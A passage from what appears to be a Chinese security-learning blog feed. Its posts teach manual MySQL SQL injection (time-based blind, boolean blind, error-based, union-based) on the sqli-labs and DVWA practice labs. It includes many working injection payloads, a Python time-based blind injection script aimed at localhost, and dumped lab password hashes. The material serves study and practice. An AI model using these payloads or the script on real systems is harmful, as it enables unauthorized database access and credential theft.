</code></pre>
<h4 id="4-拆解表名">4、拆解表名</h4>
<h5 id="判断表格数量">判断表格数量</h5>
<pre><code>1' and if((select count(table_name) from information_schema.tables where table_schema=database())=n,sleep(5),1)--+
</code></pre>
<h5 id="判断表名长度">判断表名长度</h5>
<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),num,1))&gt;guess_ascii--+
</code></pre>
<h5 id="拆解具体字符-2">拆解具体字符</h5>
<pre><code>1' and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables
where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1)--+
</code></pre>
<h4 id="5-拆解列名">5、拆解列名</h4>
<h5 id="判断列数">判断列数</h5>
<pre><code>1' and (select count(column_name) from information_schema.columns where table_name= 'admin')=n --+
</code></pre>
<h5 id="判断列名长度">判断列名长度</h5>
<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'admin' limit n-1,1),1))=guess_length --+
</code></pre>
<h5 id="判断具体字符">判断具体字符</h5>
<pre><code>1' and if(ascii(substr((select column_name from information_schema.columns where
table_name='admin' limit,0,1),1,1))&gt;100,sleep(5),1)--+
</code></pre>
<h4 id="6-拆解数据">6、拆解数据</h4>
<pre><code>1' and if(ascii(substr((select password from admin limit 0,1),1,1))&gt;100,sleep(5),1)--+
</code></pre>
<p>……</p>
<h2 id="附录python3时间注入脚本">附录：python3时间注入脚本</h2>
<pre><code># encoding=utf-8

# 时间盲注脚本
import requests
import time
import datetime


# 获取数据库长度
def database_len():
    # 存放跑出的结果
    length = 0
    database = ''
    print(&quot;start get length...&quot;)
    guess_max_length = 15

    for l in range(1, guess_max_length + 1):

        startTime1 = time.time()

        url1 = &quot;http://127.0.0.1/sqli-lab/Less-9/?id=1' and if(length(database())=%d,sleep(2),1)--+&quot; % (l)

        response1 = requests.get(url1)

        if time.time() - startTime1 &gt; 1:
            length += l

    print(&quot;the length :&quot;, str(length))

    # break

    return length


# database_len()
# 获取数据库名
def database_name(data_len):
    print(&quot;start database sql injection...&quot;)
    name = ''
    for j in range(1, data_len + 1):
        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
            url = '''http://127.0.0.1/sqli-lab/Less-9/'''
            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (
                j, i)
            # print(url+payload+'--+')
            time1 = datetime.datetime.now()
            res = requests.get(url + payload + '--+')
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec &gt;= 2:
                name += i
                print(name)
                break
    print('database_name:', name)


data_len = database_len()

database_name(data_len)

</code></pre>
<p>可能存在误差~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MySQL手注之布尔型盲注]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-bu-er-xing-mang-zhu/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-bu-er-xing-mang-zhu/">
        </link>
        <updated>2021-04-15T15:17:02.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之布尔型盲注">MySQL手注之布尔型盲注</h1>
<h2 id="原理">原理</h2>
<p>1、程序给出了判断</p>
<p>2、我们能够通过这个信息对相关信息进行判断</p>
<h2 id="常见函数">常见函数</h2>
<p>length() 返回字符串的长度</p>
<p>substr(string, start, offset) ⽤来截取字符串</p>
<p>ascii() 返回字符的ascii码</p>
<p>sleep(n) 将程序挂起⼀段时间，n为n秒</p>
<p>if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</p>
<p>limit raw offset 限制数据条数，范围（raw, raw + offset]，（行数，行数+偏移]，<a href="https://www.cnblogs.com/cai170221/p/7122289.html">参考</a></p>
<h2 id="注入流程">注入流程</h2>
<h3 id="判断注入类型">判断注入类型</h3>
<pre><code>1' and 1=1 #
</code></pre>
<h3 id="猜解数据库名">猜解数据库名</h3>
<h4 id="猜长度">猜长度</h4>
<pre><code>1' and length(database())=1 #
1' and length(database())=2 #
1' and length(database())=3 #
……
1' and length(database())=n #
</code></pre>
<h4 id="二分法逐字猜解">二分法逐字猜解</h4>
<p>得到长度后就知道这一步需要猜几个字符了</p>
<p>猜解第1个字符</p>
<pre><code>1' and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于97（⼩写字母a的ascii值）；
1' and ascii(substr(database(),1,1))&lt;122 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于122（⼩写字母z的ascii值）；
1' and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于109（⼩写字母m的ascii值）；
1' and ascii(substr(database(),1,1))&lt;103 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于103（⼩写字母g的ascii值）；
1' and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不⼩于100（⼩写字母d的ascii值）；
1' and ascii(substr(database(),1,1))&gt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不⼤于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。
</code></pre>
<p>猜解第2个字符</p>
<pre><code>1' and ascii(substr(database(),2,1))&gt;97 #，显⽰存在，说明数据库名的第二个字符的ascii值⼤于97（⼩写字母a的ascii值）；
……
</code></pre>
<p>……</p>
<p>猜解第n个字符</p>
<pre><code>1' and ascii(substr(database(),n,1))&gt;97
</code></pre>
<p>如此可以猜解出具体的数据库名</p>
<p>MUSQL常见的ascii的值</p>
<table>
<thead>
<tr>
<th>图形</th>
<th>ascii</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 ~ 9</td>
<td>48 ~ 57</td>
</tr>
<tr>
<td>A ~ Z</td>
<td>65 ~ 90</td>
</tr>
<tr>
<td>a ~ z</td>
<td>97 ~ 122</td>
</tr>
<tr>
<td>_</td>
<td>189</td>
</tr>
</tbody>
</table>
<p><a href="http://ascii.911cha.com/">ascii查询站点</a></p>
<h3 id="猜解表名">猜解表名</h3>
<h4 id="猜解表的数量">猜解表的数量</h4>
<pre><code>select count(table_name) from information_schema.tables where table_schema=database();# 查看当前数据库的表名长度
</code></pre>
<pre><code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 #
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 #
……
1' and (select count(table_name) from information_schema.tables where table_schema=database())=n #
</code></pre>
<h4 id="猜解表的长度">猜解表的长度</h4>
<h5 id="猜第1个表的长度">猜第1个表的长度</h5>
<pre><code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 #
...
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=x #=
</code></pre>
<h5 id="猜解第n个表的长度">猜解第n个表的长度</h5>
<pre><code>select table_name from information_schema.tables where table_schema=database();#列出所有表名
</code></pre>
<pre><code>select table_name from information_schema.tables where table_schema=database() limit n,1;列出第n+1个表名，
</code></pre>
<pre><code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),1))=guess_length #
</code></pre>
<h4 id="猜解表的名字">猜解表的名字</h4>
<h5 id="猜解第1个表的名字">猜解第1个表的名字</h5>
<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;guess_ascii
……
</code></pre>
<h5 id="猜解第n个表的名字">猜解第n个表的名字</h5>
<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),num,1))&gt;guess_ascii
</code></pre>
<p>n：第n个表</p>
<p>num：第n个表名的第num个字符</p>
<p>guess_ascii：猜想的ascii</p>
<h3 id="猜解字段">猜解字段</h3>
<h4 id="猜解字段数量">猜解字段数量</h4>
<pre><code>1' and (select count(column_name) from information_schema.columns where table_name= 'users')=1 #
……
1' and (select count(column_name) from information_schema.columns where table_name= 'users')=n #
</code></pre>
<h4 id="猜解字段长度">猜解字段长度</h4>
<h5 id="猜解第1个字段长度">猜解第1个字段长度</h5>
<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=1 #
……
1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))=n #
</code></pre>
<h5 id="猜解第n个字段长度">猜解第n个字段长度</h5>
<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit n-1,1),1))=guess_length #
</code></pre>
<p>n：第n个字段</p>
<p>guess_length：猜想长度</p>
<h4 id="猜解字段名">猜解字段名</h4>
<h5 id="猜解第1个字段名">猜解第1个字段名</h5>
<pre><code>1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))&gt;97 #
……
1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1,1))&gt;guess_ascii #
</code></pre>
<h5 id="猜解第n个字段名">猜解第n个字段名</h5>
<pre><code>1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit n-1,1),num,1))&gt;guess_ascii #
</code></pre>
<p>n：第n个字段</p>
<p>num：第n个字段名的第num个字符</p>
<p>guess_ascii：猜想的ascii</p>
<h3 id="猜解数据">猜解数据</h3>
<h4 id="二分法猜解数据">二分法猜解数据</h4>
<pre><code>and ascii(substr((select user from dvwa.users limit 0,1),1,1))&gt;96 #
······
and ascii(substr((select user from dvwa.users limit x-1,1),y,1))&gt;96 #
</code></pre>
<p>第x个user数据的第y个字符</p>
<h4 id="暴力猜解数据">暴力猜解数据</h4>
<pre><code>1' and (select count(*) from users where user = 'admin') = 1 #
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MySQL⼿注之报错注⼊]]></title>
        <id>https://Morn-zh.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/</id>
        <link href="https://Morn-zh.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/">
        </link>
        <updated>2021-04-14T15:15:32.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql手注之报错注入">MySQL⼿注之报错注⼊</h1>
<blockquote>
<p>参考文章：https://blog.csdn.net/he_and/article/details/80455884</p>
<p>https://www.cnblogs.com/Triomphe/p/9489639.html（推荐）</p>
<p>Burp光标bug：https://www.cnblogs.com/bk76120/p/11167585.html</p>
</blockquote>
<h2 id="环境准备">环境准备</h2>
<p><a href="https://blog.csdn.net/qq_31910239/article/details/104508896">sqli-labs的安装过程中的报错</a></p>
<h2 id="报错语句构造">报错语句构造</h2>
<h3 id="1-count-rand-group-by">(1) count() , rand() , group by</h3>
<pre><code>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;

select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
</code></pre>
<pre><code>mysql&gt; select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;  
ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key '&lt;group_key&gt;'
</code></pre>
<pre><code>mysql&gt; select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
ERROR 1062 (23000): Duplicate entry '5.7.311' for key '&lt;group_key&gt;'
</code></pre>
<ul>
<li>rand()函数会随机产生[0,1)之间的浮点数.</li>
<li>rand()函数可以自己设置随机种子,即rand(N),这个时候产生的随机数是伪随机数.也就是我们多次生成的是相同的.</li>
<li>floor(N)取整</li>
<li>concat()函数将字符串会将字符串拼接起来</li>
<li>group by a 会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组.（这里建立虚拟表的过程就是报错的原理所在）</li>
<li>count()计数</li>
</ul>
<h3 id="2-xml函数之extractvalue">(2) XML函数之ExtractValue()</h3>
<pre><code>select extractvalue(1,concat(0x7e,user(),0x7e))
</code></pre>
<pre><code>mysql&gt; select extractvalue(1,concat(0x7e,user(),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
</code></pre>
<ul>
<li>
<p>ExtractValue(xml_str , Xpath) 函数,使用Xpath表示法从XML格式的字符串中提取一个值</p>
</li>
<li>
<p>ExtractValue()函数中任意一个参数为NULL,返回值都是NULL.</p>
<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c');
+-----------------------------------------------------------------------+
| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;','/a/c') |
+-----------------------------------------------------------------------+
| accc                                                                  |
+-----------------------------------------------------------------------+
</code></pre>
<pre><code>mysql&gt; select extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL);
+---------------------------------------------------------------------+
| extractvalue('&lt;a&gt;&lt;b&gt;abbb&lt;/b&gt;&lt;c&gt;accc&lt;b&gt;acbbbb&lt;/b&gt;&lt;/c&gt;aaaa&lt;/a&gt;',NULL) |
+---------------------------------------------------------------------+
| NULL                                                                |
+---------------------------------------------------------------------+
</code></pre>
</li>
</ul>
<h3 id="3xml函数之updatexml">(3)XML函数之updatexml()</h3>
<pre><code>select updatexml(1,concat(0x7e,version(),0x7e),1) 
</code></pre>
<pre><code>mysql&gt; select updatexml(1,concat(0x7e,version(),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: '~5.7.31~'
</code></pre>
<h2 id="实践">实践</h2>
<h3 id="sqli-labs-less-17">sqli-labs Less-17</h3>
<h4 id="关键性源码">关键性源码</h4>
<pre><code>if($row)
{
    //echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
    $row1 = $row['username'];  	
    //echo 'Your Login name:'. $row1;
    $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;;//数据库中执行的语句
    mysql_query($update);
    echo &quot;&lt;br&gt;&quot;;

    if (mysql_error())
    {
        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
        print_r(mysql_error());
        echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;
        echo &quot;&lt;/font&gt;&quot;;
    }
    else
    {
        echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;';
        //echo &quot; You password has been successfully updated &quot; ;		
        echo &quot;&lt;br&gt;&quot;;
        echo &quot;&lt;/font&gt;&quot;;
    }

    echo '&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;';	//成功会显示slap1.jpg
    //echo 'Your Password:' .$row['password'];
    echo &quot;&lt;/font&gt;&quot;;



}
else  
{
    echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;';
    //echo &quot;Bug off you Silly Dumb hacker&quot;;
    echo &quot;&lt;/br&gt;&quot;;
    echo '&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;';//错误也会显示slap1.jpg
    echo &quot;&lt;/font&gt;&quot;;  
}
</code></pre>
<p>不管我们怎么输入最后返回结果都是一致的，所以我们试着用报错注入的方式看看，能不能返回我们需要的信息</p>
<p>这里补充下，源码中还对输入的信息进行了转义，后续的uname参数中的特殊字符都会被转义（那可以绕过不？）</p>
<h4 id="burp抓包">Burp抓包</h4>
<p>其中uname参数我们可以通过查看数据库（白盒测试）、查看源码、猜（布尔注入？）可以得到</p>
<p>尝试发送请求，并通过Burp进行抓包修改</p>
<pre><code>1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))#
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224913.png" alt="QQ截图20210414224913" loading="lazy"></figure>
<p>出现了转义，请教师傅后发现是<a href="https://blog.csdn.net/Xiaoxiaoqiang_/article/details/113763674">魔术引号</a>没关，关掉后重新发送</p>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210414224511.png" alt="QQ截图20210414224511" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://Morn-zh.github.io/post-images/QQ%E6%88%AA%E5%9B%BE20210415143922.png" alt="QQ截图20210415143922" loading="lazy"></figure>
<p>！！！这里如果没有关掉魔术引号，可以试试宽字符的方式绕过，具体怎么操作，后续补充</p>
<h4 id="查询表名">查询表名</h4>
<p>查询表名，并尝试将and前面的内容换一下</p>
<pre><code>abc' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
</code></pre>
<p>这里会出现报错</p>
<pre><code>Truncated incorrect DOUBLE value: 'abc‘	
</code></pre>
<p>很奇怪，改成数字就可以。</p>
<p>！！！等待解决办法</p>
<p>换回数字</p>
<pre><code>123' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))#
</code></pre>
<p>返回</p>
<pre><code>XPATH syntax error: '~emails,referers,uagents,users~'
</code></pre>
<h4 id="查询列名">查询列名</h4>
<pre><code>123’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from
information_schema.columns where table_schema='security' and table_name='users' limit
0,1),0x7e))#
</code></pre>
<p>返回</p>
<pre><code>XPATH syntax error: '~id,username,password~'
</code></pre>
<h4 id="获取数据">获取数据</h4>
<pre><code>123‘ and extractvalue(1,concat(0x7e,(select * from (select username from users limit 0,1) as
a),0x7e))#
</code></pre>
<p>返回</p>
<pre><code>XPATH syntax error: '~Dumb~'
</code></pre>
<h2 id="总结">总结</h2>
<p>报错注入多用于无法获得回显点的情况下（盲注不好用的情况），使用mysql内置的几个函数之间的特殊性，让数据库将我们想要获得的信息同报错信息一起返回给我们</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MYSQL手注之联合注入]]></title>
        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-lian-he-zhu-ru/</id>
        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-lian-he-zhu-ru/">
        </link>
        <updated>2021-04-12T14:09:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="mysql注入">MYSQL注入</h1>
<h2 id="dvwa安装">DVWA安装</h2>
<p><a href="http://cache.baiducontent.com/c?m=yOrLy9IADWBUcN5RdYdOeKF-9i5zGkd5wrXwyUNRLJ7HwsjsU4VnQBxzz_DHFUtngDwKmEqnUOS63GBeVZNvg9ekOpq1KD0aGgLwngRVVuWL3XtS9O8jOxjeSygKzUv6EC7NX3P_0NVpnvF953aVua&amp;p=8b2a97548f934eaf52b3c9204853&amp;newp=c4759a45dc8812a05afed46f574292695d0fc20e3addd401298ffe0cc4241a1a1a3aecbf2c241a05d7cf766d06aa4b5deff534703d0034f1f689df08d2ecce7e64&amp;s=1458e7509aa5f47e&amp;user=baidu&amp;fm=sc&amp;query=DVWA%B0%B2%D7%B0&amp;qid=9808245400017ec1&amp;p1=1">安装部署</a></p>
<p><a href="https://blog.51cto.com/taiji007/1738532">参考</a></p>
<h2 id="知识准备">知识准备</h2>
<h3 id="information_schema">information_schema</h3>
<p><u><strong>information_schema</strong></u>是MYSQL数据库生成时就存在的数据库，之后所有数据库、表的建立，都会在这个数据库中进行记录。</p>
<h4 id="information_schematables">information_schema.tables</h4>
<p><u><strong>tables</strong></u>是information_schema数据库中一个很重要的表格，其中记录了数据库中所有存在的表格信息。</p>
<p>包含以下字段：</p>
<ul>
<li>
<p>table_name：表名</p>
</li>
<li>
<p>table_schema：表所在数据库</p>
</li>
</ul>
<h4 id="information_schemacolumns">information_schema.columns</h4>
<p><u><strong>colunms</strong></u>是与tables表平行的一个表格，记录了所有的列名信息</p>
<p>包含以下字段：</p>
<ul>
<li>
<p>colunms_name：列名</p>
</li>
<li>
<p>table_name：表名</p>
</li>
<li>
<p>table_schema：表所在数据库</p>
</li>
</ul>
<h2 id="1-判断是否存在注入存在何种注入">1、判断是否存在注入，存在何种注入</h2>
<h2 id="2-猜表名">2、猜表名</h2>
<h2 id="3-猜列数">3、猜列数</h2>
<pre><code>order by 1;
order by 2;
……
order by n;
</code></pre>
<h2 id="4-猜列名">4、猜列名</h2>
<h2 id="5-联合查询">5、联合查询</h2>
<pre><code>union select
</code></pre>
<p>合并两次查询内容，前提是两者必须拥有同样的列数，且数据类型相同</p>
<pre><code>user：
username
password
id

news：
id
title
content

select * from news where id=1 union select username,password from user;
select * from news where id=1 union select 1,2,3 from user;
select * from news where id=1 union select 1,database(),3 from user;
</code></pre>
<h2 id="实践-1-dvwa">实践-1 DVWA</h2>
<h3 id="判断">判断</h3>
<p>输入</p>
<pre><code>'
</code></pre>
<p>返回：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <strong>'<u>'''</u>'</strong> at line 1</p>
<p>分析：去掉自带的两个单引号，还剩下<u><strong>'''</strong></u>，其中中间那个是我们输入的，则剩下的两个为sql语句中自带的</p>
<p>实际执行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = ''';
</code></pre>
<p>输入</p>
<pre><code>1' and '1'='1
</code></pre>
<p>源代码</p>
<pre><code>$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot; ;
</code></pre>
<p>输入后实际执行的</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '1';
</code></pre>
<p>这里使用字符型注入，用<u><strong>1'</strong></u>闭合前面的单引号，用<u><strong>’1</strong></u>闭合后面的单引号，并使and右边为True</p>
<p>如果是</p>
<pre><code>1' and 1=1
</code></pre>
<p>实际执行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1';
</code></pre>
<p>多出的未闭合的单引号会报错，无法运行</p>
<p>当然，注释掉最后的单引号也可以</p>
<blockquote>
<p>mysql中的注释符有哪些？</p>
<p>1、#...（单行注释）</p>
<p>2、&quot;-- &quot;，注意--后面有一个空格（单行注释）</p>
<p>3、/<em>...</em>/（多行注释）</p>
</blockquote>
<h3 id="猜列数">猜列数</h3>
<p>依次输入</p>
<pre><code>1' order by 1#
</code></pre>
<pre><code>1' order by 2#
</code></pre>
<pre><code>1' order by 3#
</code></pre>
<p>实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' order by 3#';
</code></pre>
<p>报错</p>
<p>Unknown column '3' in 'order clause'</p>
<p>说明没有第3列，一共只有2列</p>
<h3 id="联合查找">联合查找</h3>
<h4 id="数据库名-用户名">数据库名、用户名</h4>
<p>输入</p>
<pre><code>1' union select 1,2#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,2#
First name: admin
Surname: admin
ID: 1' union select 1,2#
First name: 1
Surname: 2
</code></pre>
<p>输入</p>
<pre><code>1' union select database(),user()#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select database(),user()#
First name: admin
Surname: admin
ID: 1' union select database(),user()#
First name: dvwa
Surname: dvwa@localhost
</code></pre>
<p>至此，得出数据库名为<u>dvwa</u>，用户名为<u>dvwa@localhost</u></p>
<p>以上实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),user()#';
</code></pre>
<h4 id="数据库版本和操作系统">数据库版本和操作系统</h4>
<p>输入</p>
<pre><code>1' union select version(),@@version_compile_os#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select version(),@@version_compile_os#
First name: admin
Surname: admin
ID: 1' union select version(),@@version_compile_os#
First name: 5.7.26
Surname: Win64
</code></pre>
<p>至此，得出数据库版本为<u>5.7.26</u>，操作系统为<u>Win64</u></p>
<p>其中，数据库版本需要注意，版本不同会影响后续的判断</p>
<p>当MySQL的版本⼩于4.0时，是不⽀持union select联合查询的；</p>
<p>当MySQL版本⼤于 5.0时，有个默认数据库<strong>information_schema</strong>，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 <strong>tables</strong> 的数据表，该表包含两个字段 <strong>table_name</strong> 和 <strong>table_schema</strong>，分别记录 DBMS 中的存储的<strong>表名</strong>和<strong>表名所在的数据库</strong>。</p>
<h3 id="获取表名">获取表名</h3>
<p>输入</p>
<pre><code>1' union select table_name,table_schema from information_schema.tables where
table_schema= 'dvwa'#
</code></pre>
<p>实际运行</p>
<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#';
</code></pre>
<p>报错</p>
<pre><code>Illegal mix of collations for operation 'UNION'
</code></pre>
<p>原因：</p>
<p>前文说到union查询必须保证列数一样，还需要类型一致，原以为只是整型和字符的区别，没想到连<strong>编码</strong>都得一致</p>
<p>users表中的<strong>first_name</strong>, <strong>last_name</strong>字段都是<strong>utf_unicode_ci</strong>编码，而information_schema.tables表中的<strong>table_name</strong>,<strong>table_schema</strong>字段却是<strong>utf_general_ci</strong>编码</p>
<figure data-type="image" tabindex="1"><img src="https://Morn-zh.github.io/post-images/20210412_1.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://Morn-zh.github.io/post-images/20210412_2.png" alt="" loading="lazy"></figure>
<p>没法，正常渗透过程中肯定不能让被攻击方自己把编码统一呀，只能从自己这边想办法</p>
<p>解决方法：</p>
<p>按照网上方法依葫芦画瓢</p>
<pre><code>1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
First name: admin
Surname: admin
ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
First name: 1
Surname: 6775657374626F6F6B7E647677612C75736572737E64767761
</code></pre>
<p>很明显结果为十六进制，不能解决我的问题</p>
<p>hex为转十六进制，那么尝试找找有没有十六进制转字符串的方法，unhex。</p>
<pre><code>1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
First name: admin
Surname: admin
ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
First name: 1
Surname: guestbook~dvwa,users~dvwa
</code></pre>
<p>到这都是用<u><strong>group_concat()</strong></u>将内容挤在一块，不好看，明明Ta给了两个位置，开始尝试另外的姿势</p>
<pre><code>1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: admin
Surname: admin
ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: guestbook
Surname: dvwa
ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
First name: users
Surname: dvwa
</code></pre>
<p>总结：编码既然不统一，那就让数据库自己解决，先hex再unhex，至于解码出来的是啥就看数据库咋想的了</p>
<p>当然为了后续的学习的方便，最后还是将编码统一了（删库重建</p>
<h3 id="获取列名">获取列名</h3>
<p>输入</p>
<pre><code>1' union select 1,group_concat(column_name) from information_schema.columns where
table_name='users' #
</code></pre>
<blockquote>
<p>group_concat()一次性列出</p>
<p>这里是一次性列出column_name</p>
</blockquote>
<p>返回</p>
<pre><code>ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
First name: admin
Surname: admin
ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
First name: 1
Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
</code></pre>
<h3 id="获取数据">获取数据</h3>
<p>输入</p>
<pre><code>1' union select user,password from users#
</code></pre>
<p>返回</p>
<pre><code>ID: 1' union select user,password from users#
First name: admin
Surname: admin
ID: 1' union select user,password from users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' union select user,password from users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' union select user,password from users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' union select user,password from users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' union select user,password from users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
</code></pre>
<h3 id="总结">总结</h3>
<p>判断是否存在注入</p>
<pre><code>'
</code></pre>
<p>判断列数</p>
<pre><code>order by n
</code></pre>
<p>查询数据库名、当前用户名</p>
<pre><code>select database(),user()
</code></pre>
<p>查询数据库下的表名</p>
<pre><code>select table_name,table_schema from information_schema.tables where
table_schema= 'dvwa'
</code></pre>
<p>查询表中的列名</p>
<pre><code>select 1,group_concat(column_name) from information_schema.columns where
table_name='users'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[（转载）互联网协议入门（二）]]></title>
        <id>https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/</id>
        <link href="https://Morn-zh.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/">
        </link>
        <updated>2020-11-24T11:34:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="互联网协议入门二">互联网协议入门（二）</h1>
<p><strong>七、一个小结</strong></p>
<p>先对前面的内容，做一个小结。</p>
